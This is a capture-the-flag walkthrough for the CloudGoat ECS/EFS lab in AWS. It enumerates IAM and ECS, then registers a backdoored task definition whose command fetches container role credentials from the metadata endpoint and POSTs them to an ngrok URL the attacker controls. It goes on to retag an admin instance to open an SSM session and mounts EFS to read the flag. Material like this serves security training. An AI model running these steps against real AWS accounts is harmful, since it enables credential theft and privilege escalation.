
# EFS ECS attack
The goal of this mission is to mount a file system on EFS and retrieve the flag. To build the resources for the scenario:
```
./cloudgoat.py create ecs_efs_attack
cd ecs_efs_attack<random generated strings>
```
## Privilege Enumeration
1. SSH into the instance ```ssh -i cloudgoat ubuntu@<IP address of ruse>```
2. Create a new profile (inherits the permissions from the EC2) ```aws configure --profile ruse```
3. Get the instance profile for the EC2 instance ```aws sts get-caller-identity```. The role name is found like so: arn:aws:sts::<account id>:assumed-role/<role name>/<instance id>
4. List the attached policies - 
  ```
  aws iam list-attached-role-policies --role-name <Role name>
   {
    "AttachedPolicies": [
        {
            "PolicyName": "cg-ec2-ruse-role-policy-ecs_efs_attack_cgid6sec93nj4n",
            "PolicyArn": "arn:aws:iam::<account id>:policy/<policy arn>"
        },
        {
            "PolicyName": "AmazonSSMManagedInstanceCore",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
        }
    ]
  }
  ```
5. Get the actual policy document - 
  ```
  aws iam get-policy-version --policy-arn arn:aws:iam::<account id>:policy/cg-ec2-ruse-role-policy-ecs_efs_attack_cgid6sec93nj4n --version-id v1
  {
      "PolicyVersion": {
          "Document": {
              "Statement": [
                  {
                      "Action": [
                          "ecs:Describe*",
                          "ecs:List*",
                          "ecs:RegisterTaskDefinition",
                          "ecs:UpdateService",
                          "iam:PassRole",
                          "iam:List*",
                          "iam:Get*",
                          "ec2:CreateTags",
                          "ec2:DescribeInstances",
                          "ec2:DescribeImages",
                          "ec2:DescribeTags",
                          "ec2:DescribeSnapshots"
                      ],
                      "Effect": "Allow",
                      "Resource": "*",
                      "Sid": "VisualEditor0"
                  }
              ],
              "Version": "2012-10-17"
          },
          "VersionId": "v1",
          "IsDefaultVersion": true,
          "CreateDate": "2023-04-13T04:01:32+00:00"
      }
  }
  ```
  We can see that the actions that are allowed e.g. EC2 (read), ECS (read and write) and iam (read)

## EC2 Enumeration
1. List all ec2 instances - ```aws ec2 describe-instances```. If you have lots of instances, filter by region and running state: ``` aws ec2 describe-instances --region us-east-1 --filters "Name=instance-state-name, Values=running"```
  Found 2 instances. With StartSession SSM tagged with both:
    * cg-ruse-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion true) 
    * cg-admin-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion false) <Note Instance ID>

## ECS Enumeration
1. List clusters - 
  ```
  aws ecs list-clusters
  {
      "clusterArns": [
          "arn:aws:ecs:us-east-1:<account id>:cluster/<cluster id>"
      ]
  }
  ```
2. List the services with the cluster to know which task we can update in order to go into the admin EC2. ECS highest level is a cluster-> service->task.
 ```
  aws ecs list-services --cluster <cluster arn>
  
  ```
  {
    "serviceArns": [
        "arn:aws:ecs:us-east-1:<account id>:service/<cluster name>/<service name>"
    ]
}
3. Describe the services to find task definition name
  ```
  aws ecs describe-services --cluster <cluster name> --services <service name>
  ...
  "taskDefinition": "<task definition arn>",
  ...
  ```
4. Describe the task definition and output to a file so we are able to change the behaviour
  ```
  aws ecs describe-task-definition --task-definition webapp:1 > backdoor.json
  ```
5. Change backdoor.json to the following:
```
{
	"containerDefinitions": [{
		"name": "webapp",
		"image": "python:latest",
		"cpu": 128,
		"memory": 128,
		"memoryReservation": 64,
		"portMappings": [{
			"containerPort": 80,
			"hostPort": 80,
			"protocol": "tcp"
		}],
		"essential": true,
		"entryPoint": ["sh", "-c"],
		"command": [
			"/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json <NGROK URL>/data \" "
		],
		"environment": [],
		"mountPoints": [],
		"volumesFrom": []
	}],
	"family": "webapp",
	"taskRoleArn": "<task role arn>",
	"executionRoleArn": "<task role arn>",
	"networkMode": "awsvpc",
	"volumes": [],
	"placementConstraints": [],
	"requiresCompatibilities": ["FARGATE"],
	"cpu": "256",
	"memory": "512"
}
```
6. In order to create a ngrok url, we can firstly create a http server using node.js and then use ngrok to host the service.
    1. To create an http server, install node on your machine: https://nodejs.org/en/download
        1. Create a index.js file with the contents of index.js in this repository
        2. Run the http server: ```node index.js```
        3. Validate that is working by going to ```http://localhost:8080
    2. To host your http server, follow the steps to install ngrok: https://ngrok.com/download
      1. Once you have successfully ran the installations, start a tunnel by typing: ```ngrok http 8080```
      2. There should be a Forwarding url that will be displayed in which your website will be hosted, use that url as the NGROK URL above.
      ![image](https://user-images.githubusercontent.com/39514108/232182632-27d9dd76-7cf7-42e5-8858-6ff701f980e9.png)
      3. Validate that you are able to post data to the NGROK url by using ```curl -X POST -d "random string" <NGROK URL>/data```
7. Register the task
```
aws ecs register-task-definition --cli-input-json file://backdoor.json
aws ecs update-service --serivce <service ARN> --cluster <cluster ARN> --task-definition <task ARN>
```
8. After a few minutes, you should see that the credentials are sent through in the Node terminal or in the ngrok web interface in the following format
```
{"RoleArn":<ROLEARN>, "AccessKeyId": <AccessKeyId> "SecretAccessKey":"<SecretAccessKey">}
```
## ECS Role Investigation
1. Investigate the policies associated with the role ARN retrieved from the previous step
```
aws iam list-attached-role-policies --role-name <Role ARN>
aws iam get-policy-version --policy-arn <Policy ARN> --version-id v1
```
2. We see that the ecs role has the ability to perform SSM start session as per the policy below - with the condition that StartSession is True.
```
{
    "Action": "ssm:StartSession",
    "Condition": {
	"StringEquals": {
	    "aws:ResourceTag/StartSession": "true"
	}
    },
    "Effect": "Allow",
    "Resource": "arn:aws:ec2:*:*:instance/*",
    "Sid": "VisualEditor1"
}
```
So we need to change the tags on admin ec2 to do that using the instance id role then use SSM to start a session.

## EC2 Admin Privilege Escalation
1. Use the role credentials from the POST request to assume the ecs role. These will add on to the ruse EC2 credentials.
```
aws configure --profile ecs
<Eneter Access Key, Secret Access Key, Region (same as ruse) and output as text>
```
2. Update the tags ``` aws ec2 create-tags --resource <admin instance id> --tags “Key=StartSession,Value=true”```
3. SSM Start session ```aws ssm start-session --target <admin instance id> --profile ecs```

## Mount EFS
1. EFS runs on port 2049, so we can scan the network via the following: 
```
sudo snap install nmap -> install nmap
nmap -Pn -p 2049 --open 10.10.10.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 23:08 UTC
Nmap scan report for ip-10-10-10-225.ec2.internal (10.10.10.225) -> EFS Ip Address
Host is up (0.0014s latency).

PORT     STATE SERVICE
2049/tcp open  nfs

Nmap done: 256 IP addresses (256 hosts up) scanned in 16.70 seconds
```
2. Mount the efs
```
cd /mnt
mkdir /efs
sudo apt-get -y install nfs-common -> install nfs-common
sudo mount -t nfs4 -O no_netdev -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <EFS IP>:/ /efs 
cat admin/flag.txt -> to get the final flag.
```
# References 
* Challenge https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/README.md
